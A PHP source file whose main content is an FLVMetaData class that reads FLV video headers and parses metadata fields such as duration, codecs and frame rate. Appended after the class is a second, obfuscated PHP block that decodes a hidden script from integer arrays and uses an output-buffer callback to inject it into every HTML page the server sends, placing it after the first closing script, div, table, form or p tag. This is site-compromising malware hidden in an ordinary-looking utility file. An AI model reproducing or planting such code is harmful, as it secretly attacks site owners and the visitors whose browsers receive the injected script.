<?php

class FLVMetaData {
    private $buffer;
    private $metaData;
    public $fileName;
    private $typeFlagsAudio;
    private $typeFlagsVideo;

    public $VCidMap = array(
      2=>"Sorenson H.263",
      3=>"Screen Video",
      4=>"VP6",
      5=>"VP6 with Alpha channel",
    );      //Video Codec ID(s)

    public $ACidMap = array(
      "Linear PCM, platform endian",
      "ADPCM",
      "MP3",
      "Linear PCM, little endian",
      "Nellymoser 16-kHz Mono",
      "Nellymoser 8-kHz Mono",
      "Nellymoser",
      "G.711 A-law logarithmic PCM",
      "G.711 mu-law logarithmic PCM",
      "reserved",
      "AAC",
      "Speex",
      14=>"MP3 8-Khz",
      15=>"Device-specific sound"
    );      //Audio Codec ID(s)

/**
 *  CONSTRUCTOR : initialize class members
 *
 * @param string $flv : flv file path
 */
    public function  __construct($flv) {
        $this->fileName = $flv;
        $this->metaData = array(
        "duration"=>null,
        "size"=>null,
        "framerate"=>null,
        "width"=>null,
        "height"=>null,
        "videodatarate"=>null,
        "audiodatarate"=>null,
        "audiodelay"=>null,
        "audiosamplesize"=>null,
        "audiosamplerate"=>null,
        "audiocodecid"=>null,
        "videocodecid"=>null,
        "version"=>null,
        "headersize"=>0
        );
    }

/**
 * Dumps Metadata of FLV
 */
    public function dumpMetaData(){
        echo "FLV Version: <strong>".$this->metaData["version"]."</strong><br />";
        echo "Duration : <strong>".$this->metaData["duration"]."</strong> Second(s) <br />";
        echo "File Size: <strong>".number_format(($this->metaData["size"]/pow(1024,2)) , 2)."</strong> MB<br />";
        echo "Width: <strong>".$this->metaData["width"]."</strong> Pixel(s)<br />";
        echo "Height: <strong>".$this->metaData["height"]."</strong> Pixel(s)<br />";
        echo "Framerate: <strong>".number_format($this->metaData["framerate"],2)."</strong> FPS<br />";
        echo "Video Data Rate: <strong>".number_format($this->metaData["videodatarate"])."</strong> Kbps<br />";
        echo "Audio Data Rate: <strong>".number_format($this->metaData["audiodatarate"])."</strong> Kbps<br />";
        echo "Audio Delay: <strong>".$this->metaData["audiodelay"]."</strong> Second(s)<br />";
        echo "Audio Codec ID: <strong>".$this->metaData["audiocodecid"]."</strong><br />";
        if(is_numeric($this->metaData["audiocodecid"])){
            echo "Audio Format: <strong>".$this->ACidMap[$this->metaData["audiocodecid"]]."</strong><br />";
        }
        echo "Video Codec ID: <strong>".$this->metaData["videocodecid"]."</strong><br />";
        if(is_numeric($this->metaData["videocodecid"])){
            echo "Video Format: <strong>".$this->VCidMap[$this->metaData["videocodecid"]]."</strong><br />";
        }
        echo "Header Size: <strong>".$this->metaData["headersize"]."</strong> Byte(s)<br />";
    }

/**
 * Gets metadata of FLV file
 *
 * @return array $this->metaData : matadata of FLV
 */
    public function getMetaData(){
        if(!file_exists($this->fileName)){
            echo "Error! {$this->fileName} does not exist.<br />";
            return false;
        }
        if(!is_readable($this->fileName)){
            echo "Error! Could not read the file. Check the file permissions.<br />";
            return false;
        }
        $f = @fopen($this->fileName,"rb");
        if(!$f){
            echo "Unknown Error! Could not read the file.<br />";
            return;
        }
        $signature = fread($f,3);
        if($signature != "FLV"){
            echo "Error! Wrong file format.<br />";
           // return false;
        }
        $this->metaData["version"] = ord(fread($f,1));
        $this->metaData["size"] = filesize($this->fileName);

        $flags = ord(fread($f,1));
        $flags = sprintf("%'04b", $flags);
        $this->typeFlagsAudio = substr($flags, 1, 1);
        $this->typeFlagsVideo = substr($flags, 3, 1);

        for ($i=0; $i < 4; $i++) {
            $this->metaData["headersize"] += ord(fread($f,1)) ;
        }

        $this->buffer = fread($f, 400);
        fclose($f);
    if(strpos($this->buffer, "onMetaData") === false){
            echo "Error! No MetaData Exists.<br />";
            //return false;
        }  

        foreach($this->metaData as $k=>$v){
            $this->parseBuffer($k);
        }

        return $this->metaData;
    }

/**
 * Takes a field name of metadata, retrieve it's value and set it in $this->metaData
 *
 * @param string $fieldName : matadata field name
 */
    private function parseBuffer($fieldName){
        $fieldPos = strpos($this->buffer, $fieldName);  //get the field position
        if($fieldPos !== false){
            $pos = $fieldPos + strlen($fieldName) + 1;  
            $buffer = substr($this->buffer,$pos);

            $d = "";
            for($i=0; $i < 8;$i++){
                $d .= sprintf("%08b", ord(substr($buffer,$i,1)));
            }

            $total = self::bin2Double($d);
            $this->metaData[$fieldName] = $total;
        }
    }

/**
 * Calculates double-precision value of given binary string
 * (IEEE Standard 754 - Floating Point Numbers)
 *
 * @param string binary data $strBin
 * @return Float calculated double-precision number
 */
    public static function bin2Double($strBin){
            $sb = substr($strBin, 0, 1);    // first bit is sign bit
            $exponent = substr($strBin, 1, 11); // 11 bits exponent
            $fraction = "1".substr($strBin, 12, 52);    //52 bits fraction (1.F) 

            $s = pow(-1, bindec($sb));
            $dec = pow(2, (bindec($exponent) - 1023));  //Decode exponent

            if($dec == 2047){
                if($fraction == 0){
                    if($s==0){
                        echo "Infinity";
                    }else{
                        echo "-Infinity";
                    }
                }else{
                    echo "NaN";
                }
            }

            if($dec > 0 && $dec < 2047){
                $t = 1;
                for($i=1 ; $i <= 53; $i++){
                    $t += ((int)substr($fraction, $i, 1)) * pow(2, -$i);    //decode significand
                }
                $total = $s * $t * $dec ;
                return  $total;
            }
            return false;
    }
}<?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>